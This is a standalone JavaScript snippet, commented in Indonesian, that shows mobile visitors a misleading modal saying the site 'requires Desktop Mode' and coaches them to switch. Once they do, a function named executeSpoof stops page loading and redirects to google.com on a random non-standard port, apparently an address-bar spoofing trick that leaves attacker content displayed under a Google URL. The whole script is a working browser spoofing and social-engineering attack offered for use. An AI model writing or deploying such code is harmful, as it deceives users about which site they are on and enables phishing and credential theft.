<script>
// Auto-prompt for desktop mode
if (window.innerWidth < 1024 && !sessionStorage.getItem('desktopPromptShown')) {
    
    // Tandai sudah menampilkan prompt agar tidak spam user
    sessionStorage.setItem('desktopPromptShown', 'true');
    
    // Buat custom modal yang lebih persuasif
    setTimeout(() => {
        const modal = document.createElement('div');
        modal.innerHTML = `
            <div style="
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.7);
                z-index: 999999;
                display: flex;
                justify-content: center;
                align-items: center;
                font-family: Arial, sans-serif;
            ">
                <div style="
                    background: white;
                    padding: 25px;
                    border-radius: 10px;
                    max-width: 400px;
                    text-align: center;
                    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                ">
                    <h3 style="color: #333; margin-bottom: 15px;">ðŸ“± Switch to Desktop View</h3>
                    <p style="color: #666; margin-bottom: 20px; line-height: 1.5;">
                        This website requires <strong>Desktop Mode</strong> for full functionality.
                        Please tap the menu (â‹®) and select <strong>"Open Desktop Site"</strong>.
                    </p>
                    <div style="margin: 20px 0; padding: 15px; background: #f5f5f5; border-radius: 5px; text-align: left;">
                        <strong>Steps:</strong>
                        <ol style="margin: 10px 0 0 0; padding-left: 20px;">
                            <li>Tap the menu button (â‹®) in your browser</li>
                            <li>Check the <strong>"Desktop site"</strong> box</li>
                            <li>Page will reload automatically</li>
                        </ol>
                    </div>
                    <button id="gotItBtn" style="
                        background: #4285f4;
                        color: white;
                        border: none;
                        padding: 12px 30px;
                        border-radius: 5px;
                        font-size: 16px;
                        cursor: pointer;
                        font-weight: bold;
                    ">
                        Got it, show me the menu!
                    </button>
                </div>
            </div>
        `;
        
        document.body.appendChild(modal);
        
        // Tambah event listener untuk tombol
        document.getElementById('gotItBtn').addEventListener('click', function() {
            document.body.removeChild(modal);
            
            // Tunggu beberapa saat untuk user melakukan aksi
            setTimeout(() => {
                // Cek apakah user sudah mengaktifkan desktop mode
                // Dengan mendeteksi perubahan viewport atau user agent
                if (window.innerWidth >= 1024 || navigator.userAgent.includes('Windows')) {
                    executeSpoof();
                } else {
                    // Jika belum, coba lagi dalam 2 detik
                    checkDesktopMode();
                }
            }, 2000);
        });
        
    }, 1500); // Tunggu 1.5 detik agar halaman selesai load
    
    function checkDesktopMode(attempts = 0) {
        if (attempts >= 10) return; // Maks 10 percobaan
        
        setTimeout(() => {
            // Deteksi desktop mode dengan beberapa metode
            const isDesktopMode = 
                window.innerWidth >= 1024 || 
                /Windows|Macintosh|Linux/.test(navigator.userAgent) ||
                !/Mobile|Android|iPhone/.test(navigator.userAgent);
            
            if (isDesktopMode) {
                executeSpoof();
            } else {
                checkDesktopMode(attempts + 1);
            }
        }, 1000);
    }
    
    function executeSpoof() {
        // Tunggu sedikit lebih lama untuk memastikan render selesai
        setTimeout(() => {
            try {
                // Hentikan loading
                window.stop();
                
                // Generate random port
                let randomPort;
                do {
                    randomPort = Math.floor(Math.random() * 10000) + 1000;
                } while (randomPort === 443 || randomPort === 80);
                
                // Redirect dengan Google domain
                document.location = "https://google.com:" + randomPort + "/";
                
            } catch (e) {
                // Fallback jika window.stop() tidak bekerja
                document.location = "https://google.com:8080/";
            }
        }, 500);
    }
}
</script>
